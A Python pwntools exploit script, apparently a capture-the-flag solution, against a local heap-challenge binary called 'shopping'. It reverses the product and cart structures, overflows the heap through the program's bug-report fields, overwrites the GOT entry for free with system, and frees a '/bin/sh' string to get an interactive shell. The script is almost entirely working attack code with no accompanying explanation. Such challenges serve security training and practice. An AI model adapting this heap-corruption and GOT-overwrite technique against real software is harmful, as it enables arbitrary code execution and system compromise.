from pwn import *
p = process('./shopping')

'''
struct product_t
{
  char *name;
  int price;
  float rate; int num;
  int unknown2;
  struct product_t *next;
};

struct cart_item_t
{
  struct product_t *pdt;
  __int64 num;
  struct cart_item_t *next; 
};
'''

def menu():
	p.recvuntil(': ')

def add_product(name, price, stock):
	menu()
	p.sendline('1')
	menu()
	p.sendline('1')

	p.recvuntil('Name >> ')
	p.sendline(name)
	p.recvuntil('Price >> ')
	p.sendline(str(price))
	p.recvuntil('Stock >> ')
	p.sendline(str(stock))

	menu()
	p.sendline('0')

def reset():
	menu()
	p.sendline('1')
	menu()
	p.sendline('3')

	menu()
	p.sendline('0')

def add_cart(name, cnt):
	menu()
	p.sendline('2')
	menu()
	p.sendline('1')

	p.recvuntil('name >> ')
	p.sendline(name)
	p.recvuntil('Amount >> ')
	p.sendline(str(cnt))

	menu()
	p.sendline('0')

def buy():
	menu()
	p.sendline('2')
	menu()
	p.sendline('3')
	
	menu()
	p.sendline('0')

# free_:
free_got = 0x603018
free_to_system = 0x3c770

add_product('B' * 0x30, 1, 1)
add_product('C' * 0x30, 1, 1)
add_product('\xff' * 0x3f, 1, 1)
reset()

add_product('B' * 0x30, 1, 0x21)
add_product('C' * 0x30, 1, 0x21)
add_product('AAA', 0x1000000, 0x100)
add_cart('AAA', 0xc0)
buy()
add_cart('C' * 0x30, 0x21)
add_cart('B' * 0x30, 0x21)

'''
WTF!? My shop went bankrupt...
Can you cooperate with the bug report? (y/N) >> $ y

#$&#$&#$& SEND BUG REPORT &$#&$#&$#
your name  : $ BBBBBBBB
when crash : $ CCCCCCCC
Thank you for sending me a bug report
'''

p.recvuntil('Exit\n: ')
p.sendline('1')
p.recvuntil(' (y/N) >> ')
p.sendline('y')
p.recvuntil(' : ')
p.sendline('S' * 0x30)
p.recvuntil(' : ')
payload = 'A' * 42 + '\x51'
p.sendline(payload)
menu()
p.sendline('0')

add_product('B', 1, free_to_system)
add_cart('B', free_to_system)
payload = 'C' * 0x20 + '/bin/sh;#'.ljust(0x20, 'C') + p64(free_got - 0x10)
add_product(payload, 1, 1)
buy()
reset()

p.interactive()
